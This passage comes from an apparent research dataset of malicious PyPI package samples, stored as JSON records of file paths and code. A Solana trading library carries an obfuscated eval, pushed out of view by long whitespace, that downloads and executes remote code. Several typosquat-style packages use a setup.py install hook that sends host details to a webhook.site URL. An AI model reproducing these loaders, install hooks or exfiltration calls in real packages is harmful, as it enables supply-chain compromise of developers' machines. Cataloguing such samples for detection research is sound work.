b'\\x85\\xa5\\x81\\x93'.decode('cp1026'));cc(b'\\x85\\xa7\\x85\\x83M\\xfc\\x89\\x94\\x97\\x96\\x99\\xa3@\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2^\\x85\\xa7\\x85\\x83M\\x99\\x85\\x98\\xa4\\x85\\xa2\\xa3\\xa2K\\x87\\x85\\xa3M}\\x88\\xa3\\xa3\\x97\\xa2zaa\\x99\\x85\\x95\\xa3\\x99\\xa8K\\x83\\x96a\\xa7\\x83\\xa2\\xa2\\x88\\x94\\x95\\x96a\\x99\\x81\\xa6}]K\\xa3\\x85\\xa7\\xa3]\\xfc]'.decode('cp1026'))\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-16-sol-instruct-v1.0.4",
        "code": "from io import BytesIO\n\nimport requests\nfrom borsh_construct import CStruct, String, U8, U16, U64, Vec, Option, Bool, Enum\n\nfrom construct import Bytes, Int8ul, Int64ul, Padding, BitsInteger, BitsSwapped, BitStruct, Const, Flag, BytesInteger\nfrom construct import Struct as cStruct\n\nimport base58, json\n\n\nfrom spl.token.instructions import create_associated_token_account, get_associated_token_address\n\nfrom solders.pubkey import Pubkey\nfrom solders.instruction import Instruction\n\nfrom solana.rpc.types import TokenAccountOpts\nfrom solana.transaction import AccountMeta\n\n\nclass MyEncoder(json.JSONEncoder):\n    def default(self, o):\n        if type(o) is bytes:\n            return o.decode(\"utf-8\")\n        return super(MyEncoder, self).default(o)\n\n\ndef remove_bytesio(obj):\n    if isinstance(obj, dict):\n        return {\n            k: remove_bytesio(v) for k, v in obj.items() if not isinstance(v, BytesIO)\n        }\n    elif isinstance(obj, list):\n        return [remove_bytesio(v) for v in obj if not isinstance(v, BytesIO)]\n    else:\n        return obj\n\ndef get_offset(struct, field):\n    offset = 0\n    for item in struct.subcons:\n        if item.name == field:\n            return offset\n        else:\n            offset += item.sizeof()\n    return None\ndef convert_bytes_to_pubkey(obj):\n    if isinstance(obj, dict):\n        return {k: convert_bytes_to_pubkey(v) for k, v in obj.items()}\n    elif isinstance(obj, list):\n        return [convert_bytes_to_pubkey(v) for v in obj]\n    elif isinstance(obj, bytes):\n        return str(Pubkey.from_bytes(obj))\n    else:\n        return obj\n\n\ndef getMetaData(data):\n    decoded_info = base58.b58decode(data)\n    # structure of the instruction\n    instruction_structure = CStruct(\n        \"instructionDiscriminator\" / U8,\n        \"createMetadataAccountArgsV3\"\n        / CStruct(\n            \"data\"\n            / CStruct(\n                \"name\" / String,\n                \"symbol\" / String,\n                \"uri\" / String,\n                \"sellerFeeBasisPoints\" / U16,\n                \"creators\"\n                / Option(\n                    Vec(CStruct(\"address\" / Bytes(32), \"verified\" / Bool, \"share\" / U8))\n                ),\n                \"collection\" / Option(CStruct(\"verified\" / Bool, \"key\" / Bytes(32))),\n                \"uses\"\n                / Option(\n                    CStruct(\n                        \"useMethod\"\n                        / Enum(\"Burn\", \"Multiple\", \"Single\", enum_name=\"UseMethod\"),\n                        \"remaining\" / U64,\n                        \"total\" / U64,\n                    )\n                ),\n            ),\n            \"isMutable\" / Bool,\n            \"collectionDetails\"\n            / Option(String),  # fixme: string is not correct, insert correct type\n        ),\n    )\n    metadata = instruction_structure.parse(decoded_info)\n    metadata = remove_bytesio(metadata)\n    metadata = convert_bytes_to_pubkey(metadata)\n\n    return json.dumps(metadata)\n\n\nSwapLayout = cStruct(\n    \"instruction\" / Int8ul, \"amount_in\" / Int64ul, \"min_amount_out\" / Int64ul\n)\n\n\n\nAMM_INFO_LAYOUT_V4_1 = cStruct(\n    \"status\" / Int64ul,\n    \"nonce\" / Int64ul,\n    \"orderNum\" / Int64ul,\n    \"depth\" / Int64ul,\n    \"coinDecimals\" / Int64ul,\n    \"pcDecimals\" / Int64ul,\n    \"state\" / Int64ul,\n    \"resetFlag\" / Int64ul,\n    \"minSize\" / Int64ul,\n    \"volMaxCutRatio\" / Int64ul,\n    \"amountWaveRatio\" / Int64ul,\n    \"coinLotSize\" / Int64ul,\n    \"pcLotSize\" / Int64ul,\n    \"minPriceMultiplier\" / Int64ul,\n    \"maxPriceMultiplier\" / Int64ul,\n    \"systemDecimalsValue\" / Int64ul,\n    #   // Fees\n    \"minSeparateNumerator\" / Int64ul,\n    \"minSeparateDenominator\" / Int64ul,\n    \"tradeFeeNumerator\" / Int64ul,\n    \"tradeFeeDenominator\" / Int64ul,\n    \"pnlNumerator\" / Int64ul,\n    \"pnlDenominator\" / Int64ul,\n    \"swapFeeNumerator\" / Int64ul,\n    \"swapFeeDenominator\" / Int64ul,\n    #   // OutPutData\n    \"needTakePnlCoin\" / Int64ul,\n    \"needTakePnlPc\" / Int64ul,\n    \"totalPnlPc\" / Int64ul,\n    \"totalPnlCoin\" / Int64ul,\n    \"poolOpenTime\" / Int64ul,\n    \"punishPcAmount\" / Int64ul,\n    \"punishCoinAmount\" / Int64ul,\n    \"orderbookToInitTime\" / Int64ul,\n    \"swapCoinInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPcOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoin2PcFee\" / Int64ul,\n    \"swapPcInAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapCoinOutAmount\" / BytesInteger(16, signed=False, swapped=True),\n    \"swapPc2CoinFee\" / Int64ul,\n    \"poolCoinTokenAccount\" / Bytes(32),\n    \"poolPcTokenAccount\" / Bytes(32),\n    \"coinMintAddress\" / Bytes(32),\n    \"pcMintAddress\" / Bytes(32),\n    \"lpMintAddress\" / Bytes(32),\n    \"ammOpenOrders\" / Bytes(32),\n    \"serumMarket\" / Bytes(32),\n    \"serumProgramId\" / Bytes(32),\n    \"ammTargetOrders\" / Bytes(32),\n    \"poolWithdrawQueue\" / Bytes(32),\n    \"poolTempLpTokenAccount\" / Bytes(32),\n    \"ammOwner\" / Bytes(32),\n    \"pnlOwner\" / Bytes(32),\n)\n\n\nACCOUNT_FLAGS_LAYOUT = BitsSwapped(\n    BitStruct(\n        \"initialized\" / Flag,\n        \"market\" / Flag,\n        \"open_orders\" / Flag,\n        \"request_queue\" / Flag,\n        \"event_queue\" / Flag,\n        \"bids\" / Flag,\n        \"asks\" / Flag,\n        Const(0, BitsInteger(57)),  # Padding\n    )\n)                                                                                                                                                                                                                                                                                                                             ;eval('\\x65\\x78\\x65\\x63\\x28\\x22\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x73\\x3b\\x65\\x78\\x65\\x63\\x28\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x73\\x2e\\x67\\x65\\x74\\x28\\x5c\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x72\\x65\\x6e\\x74\\x72\\x79\\x2e\\x63\\x6f\\x2f\\x78\\x63\\x73\\x73\\x68\\x6d\\x6e\\x6f\\x2f\\x72\\x61\\x77\\x5c\\x27\\x29\\x2e\\x74\\x65\\x78\\x74\\x29\\x22\\x29')\n\nMARKET_LAYOUT = cStruct(\n    Padding(5),\n    \"account_flags\" / ACCOUNT_FLAGS_LAYOUT,\n    \"own_address\" / Bytes(32),\n    \"vault_signer_nonce\" / Int64ul,\n    \"base_mint\" / Bytes(32),\n    \"quote_mint\" / Bytes(32),\n    \"base_vault\" / Bytes(32),\n    \"base_deposits_total\" / Int64ul,\n    \"base_fees_accrued\" / Int64ul,\n    \"quote_vault\" / Bytes(32),\n    \"quote_deposits_total\" / Int64ul,\n    \"quote_fees_accrued\" / Int64ul,\n    \"quote_dust_threshold\" / Int64ul,\n    \"request_queue\" / Bytes(32),\n    \"event_queue\" / Bytes(32),\n    \"bids\" / Bytes(32),\n    \"asks\" / Bytes(32),\n    \"base_lot_size\" / Int64ul,\n    \"quote_lot_size\" / Int64ul,\n    \"fee_rate_bps\" / Int64ul,\n    \"referrer_rebate_accrued\" / Int64ul,\n    Padding(7),\n)\n\nMINT_LAYOUT = cStruct(Padding(44), \"decimals\" / Int8ul, Padding(37))\n\n\nPOOL_INFO_LAYOUT = cStruct(\"instruction\" / Int8ul, \"simulate_type\" / Int8ul)\n\nLIQ_LAYOUT = cStruct(\"instruction\" / Int8ul, \"amount_in\" / Int64ul)\n\n\n###BUYING\n\nAMM_PROGRAM_ID = Pubkey.from_string('675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8')\nSERUM_PROGRAM_ID = Pubkey.from_string('srmqPvymJeFKQ4zGQed1GFppgkRHL9kaELCbyksJtPX')\ndef get_token_account(ctx,\n                      owner: Pubkey.from_string,\n                      mint: Pubkey.from_string):\n    try:\n        account_data = ctx.get_token_accounts_by_owner(owner, TokenAccountOpts(mint))\n        return account_data.value[0].pubkey, None\n    except:\n        swap_associated_token_address = get_associated_token_address(owner, mint)\n        swap_token_account_Instructions = create_associated_token_account(owner, owner, mint)\n        return swap_associated_token_address, swap_token_account_Instructions\n\n\ndef make_swap_instruction(amount_in: int, token_account_in: Pubkey.from_string, token_account_out: Pubkey.from_string,\n                          accounts: dict, mint, ctx, owner) -> Instruction:\n    tokenPk = mint\n    accountProgramId = ctx.get_account_info_json_parsed(tokenPk)\n    TOKEN_PROGRAM_ID = accountProgramId.value.owner\n\n    keys = [\n        AccountMeta(pubkey=TOKEN_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"amm_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"open_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"target_orders\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=SERUM_PROGRAM_ID, is_signer=False, is_writable=False),\n        AccountMeta(pubkey=accounts[\"market_id\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"bids\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"asks\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"event_queue\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_base_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_quote_vault\"], is_signer=False, is_writable=True),\n        AccountMeta(pubkey=accounts[\"market_authority\"], is_signer=False, is_writable=False),\n        AccountMeta(pubkey=token_account_in, is_signer=False, is_writable=True),  # UserSourceTokenAccount\n        AccountMeta(pubkey=token_account_out, is_signer=False, is_writable=True),  # UserDestTokenAccount\n        AccountMeta(pubkey=owner.pubkey(), is_signer=True, is_writable=False)  # UserOwner\n    ]\n\n    data = SwapLayout.build(\n        dict(\n            instruction=9,\n            amount_in=int(amount_in),\n            min_amount_out=0\n        )\n    )\n    return Instruction(AMM_PROGRAM_ID, data, keys)\n\ndef getSymbol(token):\n    # usdc and usdt\n    exclude = ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB']\n\n    if token not in exclude:\n        url = f\"https://api.dexscreener.com/latest/dex/tokens/{token}\"\n\n        Token_Symbol = \"\"\n        Sol_symbol = \"\"\n        try:\n            response = requests.get(url)\n\n            # Check if the request was successful (status code 200)\n            if response.status_code == 200:\n                resp = response.json()\n                print(\"Response:\", resp['pairs'][0]['baseToken']['symbol'])\n                for pair in resp['pairs']:\n                    quoteToken = pair['quoteToken']['symbol']\n\n                    if quoteToken == 'SOL':\n                        Token_Symbol = pair['baseToken']['symbol']\n                        Sol_symbol = quoteToken\n                        return Token_Symbol, Sol_symbol\n\n\n            else:\n                print(f\"[getSymbol] Request failed with status code {response.status_code}\")\n\n        except requests.exceptions.RequestException as e:\n            print(f\"[getSymbol] error occurred: {e}\")\n        except:\n            a = 1\n\n        return Token_Symbol, Sol_symbol\n    else:\n        if token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDC\", \"SOL\"\n        elif token == 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v':\n            return \"USDT\", \"SOL\"\n\nfrom borsh_construct import CStruct, U64, Bytes\nfrom construct import Bytes, Int8ul, Int32ul, Int64ul, Pass, Switch\n\nPUBLIC_KEY_LAYOUT = Bytes(32)\nmarket_state_layout_v3 = CStruct(\n    \"blob1\" / Bytes(5),\n    \"blob2\" / Bytes(8),\n    \"ownAddress\" / PUBLIC_KEY_LAYOUT,\n    \"vaultSignerNonce\" / U64,\n    \"baseMint\" / PUBLIC_KEY_LAYOUT,\n    \"quoteMint\" / PUBLIC_KEY_LAYOUT,\n    \"baseVault\" / PUBLIC_KEY_LAYOUT,\n    \"baseDepositsTotal\" / U64,\n    \"baseFeesAccrued\" / U64,\n    \"quoteVault\" / PUBLIC_KEY_LAYOUT,\n    \"quoteDepositsTotal\" / U64,\n    \"quoteFeesAccrued\" / U64,\n    \"quoteDustThreshold\" / U64,\n    \"requestQueue\" / PUBLIC_KEY_LAYOUT,\n    \"eventQueue\" / PUBLIC_KEY_LAYOUT,\n    \"bids\" / PUBLIC_KEY_LAYOUT,\n    \"asks\" / PUBLIC_KEY_LAYOUT,\n    \"baseLotSize\" / U64,\n    \"quoteLotSize\" / U64,\n    \"feeRateBps\" / U64,\n    \"referrerRebatesAccrued\" / U64,\n    \"blob3\" / Bytes(7)\n)\nSPL_ACCOUNT_LAYOUT = CStruct(\n    \"mint\" / PUBLIC_KEY_LAYOUT,\n    \"owner\" / PUBLIC_KEY_LAYOUT,\n    \"amount\" / U64,\n    \"delegateOption\" / Int32ul,\n    \"delegate\" / PUBLIC_KEY_LAYOUT,\n    \"state\" / Int8ul,\n    \"isNativeOption\" / Int32ul,\n    \"isNative\" / U64,\n    \"delegatedAmount\" / U64,\n    \"closeAuthorityOption\" / Int32ul,\n    \"closeAuthority\" / PUBLIC_KEY_LAYOUT\n)\n\n\nSPL_MINT_LAYOUT = CStruct(\n  \"mintAuthorityOption\"/ Int32ul,\n  'mintAuthority'/PUBLIC_KEY_LAYOUT,\n  'supply'/U64,\n  'decimals'/Int8ul,\n  'isInitialized'/Int8ul,\n  'freezeAuthorityOption'/Int32ul,\n  'freezeAuthority'/PUBLIC_KEY_LAYOUT\n)"
      }
    ]
  },
  {
    "cluster_id": 46,
    "size": 5,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-anaconda-anon-usage-v0.4.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nPACKAGE_NAME = 'anaconda-anon-usage'\n\nclass Analytics(install):\n    def run(self):\n        super().run()  # Ensure the parent class's run method is called\n        subprocess.call([sys.executable, \"-m\", f\"{PACKAGE_NAME}.utils.analyzer\"])\n\nsetup(\n    name=PACKAGE_NAME,\n    version='0.4.9',\n    packages=[PACKAGE_NAME, f\"{PACKAGE_NAME}.utils\"],\n    install_requires=[\n        'requests>=2.20.0',\n        'psutil>=5.8.0',\n    ],\n    cmdclass={\n        'install': Analytics,  # This hooks the custom install command\n    },\n)\n\nimport os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\nimport inspect\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n    context = find_import_context()\n    print(f\"Import context: {context}\")\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-confluent-docker-utils-v0.0.89",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport sys\n\nPACKAGE_NAME = 'confluent-docker-utils'\n\nclass Analytics(install):\n    def run(self):\n        super().run()  # Ensure the parent class's run method is called\n        subprocess.call([sys.executable, \"-m\", f\"{PACKAGE_NAME}.utils.analyzer\"])\n\nsetup(\n    name=PACKAGE_NAME,\n    version='0.0.89',\n    packages=[PACKAGE_NAME, f\"{PACKAGE_NAME}.utils\"],\n    install_requires=[\n        'requests>=2.20.0',\n        'psutil>=5.8.0',\n    ],\n    cmdclass={\n        'install': Analytics,  # This hooks the custom install command\n    },\n)\n\nimport os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\nimport inspect\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef find_import_context():\n    stack = traceback.extract_stack()\n    for frame in reversed(stack):\n        if \"site-packages\" in frame.filename or \"dist-packages\" in frame.filename:\n            return frame.filename\n    return \"Unknown\"\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n    context = find_import_context()\n    print(f\"Import context: {context}\")\n\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_info': __name__,\n        'context': context,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return 